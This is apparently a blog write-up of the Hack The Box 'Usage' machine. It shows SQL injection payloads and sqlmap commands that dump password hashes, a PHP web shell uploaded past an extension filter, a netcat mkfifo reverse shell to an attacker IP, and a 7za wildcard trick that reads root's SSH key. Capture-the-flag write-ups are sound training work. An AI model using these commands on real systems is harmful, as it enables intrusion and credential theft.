---
title: HTB-Usage
draft: false
tags:
  - htb
  - linux
  - easy
  - laravel
  - file-upload
  - sudo
  - sudoers
  - wildcard
  - sqlmap
  - sqli
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/Usage.png)

## Information Gathering
### Rustscan

Rustscan discovers HTTP and SSH open:

```bash
┌──(yoon㉿kali)-[~/Downloads]
└─$ rustscan --addresses 10.10.11.18 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received syn-ack (0.31s latency).
Scanned at 2024-05-17 06:22:29 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```


## Enumeration
### HTTP - TCP 80

After adding **usage.htb** to `/etc/hosts`, we can access the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u5.png)

**Admin** directs us to **admin.usage.htb**, which I also add to `/etc/hosts`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image.png)

**Reset Password** directs to `/forget-password`, and we can submit email address to reset password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u1.png)

## Laravel SQLi

**Wappalyzer** shows that **Laravel** is running on the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u4.png)

[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel) provides detailed guides on exploiting Laravel.

After reading through, it seems like we might be able to do SQL Injection attack. 

Testing all possible entry points, `/forget-password` email parameter is found to be vulnerable.

Let's first intercept request for reset password using Burp Suite:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-3.png)

Using [this list](https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file#generic-error-based-payloads) for fuzzing the email paramenter, it seems that length of 7729 is a redirection page and length of 1616 is 500 error page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-7.png)

### SQLi Detection

Let's try identifying the number of columns.

Submitting `a' ORDER BY 8;-- -` will direct us to redirection page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-5.png)

Submitting `a' ORDER BY 9;-- -` shows Server Error, indicating there's 8 columns:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-6.png)


### SQLMap

Let's automate the exploitation using sqlmap and set the parameter email to be vulnerable:

`sqlmap -r forget-pass-req.txt -p email --batch --level 5 --risk 3 --dbs`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u3.png)

Sqlmap finds three databases. 
Let's look more in to **usage_blog** database:

`sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog --tables`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/u2.png)

After dumping the password hash inside **admin_users** table using `sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog -T admin_users --dump`, we can crack the password hash using john using  `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcryptbas`, and the password is cracked to be **whatever1**. 


## Shell as dash
### admin.usage.htb

Using the cracked password, we can successfully sign-in to the dashboard:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-1.png)

At the bottom right, Laravel version is shown: **1.8.17**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-11.png)

### File Upload

Googling for Larval 1.8.17 exploit, we come across [File Upload Vulnerability](https://www.exploit-db.com/exploits/49112).

We should be able to exploit this vulnerability and obtain reverse shell via uploading malicious payload to the below profile page's avatar image:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-13.png)


In order to bypass upload extension blacklist filter, I will upload [p0wny shell](https://github.com/flozz/p0wny-shell) with the extension of **.jpg.php**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-16.png)

File successfully uploads and we can access the shell through `http://admin.usage.htb/uploads/images/pown.jpg.php`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-17.png)

Now that we have a shell as **dash**, let's spawn a reverse shell using the following command:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.29 1337 >/tmp/f`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-18.png)

We have successfully obtained reverse shell as **dash**.

## Privesc: dash to xander

Looking around file system, we several unusual files such as **.monit.id** and **.monitrc**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-19.png)

**.monitrc** file reveals potential password: `3nc0d3d_pa$$w0rd`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-20.png)


Let's identify users on the system in order to spray the discovered potential password:

`cat /etc/passwd | grep /home`


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-21.png)


User **syslog** and **xander** is also on the system. 

After trying the password for both users for SSH connection, we have a valid match for **xander**:

`sudo ssh xander@usage.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-22.png)


## Privesc: xander to root

### Sudoers

Checking on commands that could be ran with **sudo** privilege, `/usr/bin/usage_management` is noticed:

`sudo -l`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-23.png)


Running `strings` on it, we can several interesting process happening in there:

`strings /usr/bin/usage_management`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-24.png)

**7za** (7-Zip) tool is being used create a ZIP archive of files in the current directory:

`/usr/bin/7za a /var/backups/project.zip -tzip -snl -:

`/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql`

### Wildcard

Researching a bit on this, it seems like we can abuse the [wildcard spare](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks):

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-25.png)


Let's first create **id_rsa** file inside `/var/www/html` and link it to root's id_rsa file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-27.png)

Now let's run `/usr/bin/usage_management` with **sudo**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-28.png)

As the `/usr/bin/usage_management` stops running, it throws back root's **id_rsa** key:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-29.png)

Using root's id_rsa, we can now sign-in to the system as the root:

`ssh -i id_rsa root@usage.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/usage/image-26.png)




## References
- https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file#generic-error-based-payloads
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel

